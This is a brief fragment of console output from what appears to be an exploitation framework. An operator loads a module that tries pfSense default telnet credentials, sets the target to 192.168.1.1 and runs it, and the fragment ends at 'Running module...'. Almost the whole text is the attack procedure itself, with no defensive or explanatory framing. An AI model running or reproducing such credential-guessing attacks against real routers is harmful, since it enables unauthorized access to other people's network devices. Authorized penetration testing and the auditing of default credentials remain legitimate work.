...
```
exf > use creds/routers/pfsense/telnet_default_creds
exf (PFSense Router Default Telnet Creds) > set target 192.168.1.1
[+] target => 192.168.1.1
exf (PFSense Router Default Telnet Creds) > run
[*] Running module...
